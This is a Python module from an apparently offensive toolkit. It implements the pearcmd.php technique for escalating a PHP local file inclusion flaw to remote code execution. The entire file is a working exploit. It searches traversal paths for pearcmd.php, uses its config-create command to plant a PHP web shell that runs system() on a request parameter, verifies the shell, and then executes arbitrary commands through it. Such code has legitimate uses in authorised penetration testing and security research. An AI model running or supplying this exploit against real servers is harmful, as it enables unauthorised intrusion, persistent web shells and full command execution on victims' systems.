"""
PearcMD technique implementation for LFI to RCE exploitation.

This technique uses the pearcmd.php file in PHP installations to achieve RCE
by using directory traversal to include the file and execute commands through it.
"""

import logging
import re
import random
import string
import urllib.parse
from typing import List, Optional

import requests

from ..exceptions import TechniqueError, ExecutionError
from ..techniques.base import TechniqueBase

logger = logging.getLogger("elle-est-fit")


class PearcmdTechnique(TechniqueBase):
    """
    Exploit LFI using pearcmd.php.

    This technique uses directory traversal to access pearcmd.php and use
    its config-create functionality to write a shell file.
    """

    name = "pearcmd"
    description = "LFI to RCE via pearcmd.php config-create"

    def __init__(self, **kwargs):
        """Initialize the Pearcmd technique."""
        super().__init__(**kwargs)
        self.verbose = kwargs.get("verbose", False)
        self.shell_token = "".join(
            random.choice(string.ascii_letters) for _ in range(8)
        )
        self.detection_string = f"ELLEESTFIT_{self.shell_token}"

        # Common locations for pearcmd.php
        self.pearcmd_paths = [
            "../../../../usr/local/lib/php/pearcmd",
            "../../../usr/local/lib/php/pearcmd",
            "../../usr/local/lib/php/pearcmd",
            "../usr/local/lib/php/pearcmd",
            "../../../../usr/share/php/pearcmd",
            "../../../usr/share/php/pearcmd",
            "../../usr/share/php/pearcmd",
            "../usr/share/php/pearcmd",
        ]

        # Locations to write shell
        self.shell_locations = [
            "/tmp/shell_{}.php".format(self.shell_token),
            "/var/tmp/shell_{}.php".format(self.shell_token),
        ]

        self.pearcmd_path = None
        self.shell_path = None

    def check(self) -> bool:
        """
        Check if the target is vulnerable to the Pearcmd technique.

        Returns:
            True if the technique is viable, False otherwise
        """
        logger.info("Checking if target is vulnerable to pearcmd.php technique")

        # Test for existence of pearcmd.php
        for path in self.pearcmd_paths:
            test_url = self.target.format(path)

            if self.verbose:
                logger.debug(f"Testing pearcmd.php at: {test_url}")

            try:
                response = self.session.get(test_url + "&?+help", timeout=self.timeout)

                # Check if the response indicates pearcmd.php was successfully included
                if "PEAR" in response.text and "Commands:" in response.text:
                    logger.info(f"Found pearcmd.php at {path}")
                    self.pearcmd_path = path
                    return True
            except Exception as e:
                if self.verbose:
                    logger.debug(f"Error checking {path}: {str(e)}")

        logger.info("Could not find pearcmd.php or target is not vulnerable")
        return False

    def exploit(self) -> bool:
        """
        Exploit the LFI using pearcmd.php to achieve RCE.

        Returns:
            True if successful, False otherwise
        """
        if not self.pearcmd_path:
            if not self.check():
                logger.error("Target is not vulnerable to pearcmd.php technique")
                return False

        logger.info("Exploiting using pearcmd.php technique")

        # Try to write shell to different locations
        for shell_location in self.shell_locations:
            try:
                # Create a simple PHP shell
                php_shell = (
                    f"<?php echo '{self.detection_string}'; system($_GET['cmd']); ?>"
                )

                # Build config-create command
                config_param = f"+config-create+/&{self.pearcmd_path}&/{php_shell}+{shell_location}"

                logger.debug(f"Attempting to create shell at {shell_location}")

                # Make the request
                response = self.session.get(
                    self.target.format(config_param), timeout=self.timeout
                )

                # Check for successful config creation
                if (
                    "configuration written" in response.text.lower()
                    or "created" in response.text.lower()
                ):
                    logger.info(f"Successfully created shell at {shell_location}")

                    # Now verify the shell by testing it
                    shell_path = None

                    # Extract just the filename for inclusion
                    if shell_location.startswith("/tmp/"):
                        shell_path = "../../../../tmp/shell_{}".format(self.shell_token)
                    elif shell_location.startswith("/var/tmp/"):
                        shell_path = "../../../../var/tmp/shell_{}".format(
                            self.shell_token
                        )

                    # Test the shell
                    if shell_path:
                        test_response = self.session.get(
                            self.target.format(shell_path) + "?cmd=echo%20TEST",
                            timeout=self.timeout,
                        )

                        if self.detection_string in test_response.text:
                            logger.info("Shell verified and working")
                            self.shell_path = shell_path
                            return True
            except Exception as e:
                logger.debug(f"Error during exploitation: {str(e)}")
                continue

        logger.error("Failed to create shell using pearcmd.php")
        return False

    def execute(self, command: str) -> str:
        """
        Execute a command via the established RCE.

        Args:
            command: Command to execute

        Returns:
            Command output
        """
        if not self.shell_path:
            raise ExecutionError("No shell established. Run exploit() first.")

        # Encode the command
        encoded_command = urllib.parse.quote(command)

        try:
            # Execute the command
            response = self.session.get(
                self.target.format(self.shell_path) + f"?cmd={encoded_command}",
                timeout=self.timeout,
            )

            # Extract the command output (everything after the detection string)
            if self.detection_string in response.text:
                output = response.text.split(self.detection_string)[1].strip()
                return output
            else:
                return response.text
        except Exception as e:
            raise ExecutionError(f"Failed to execute command: {str(e)}")
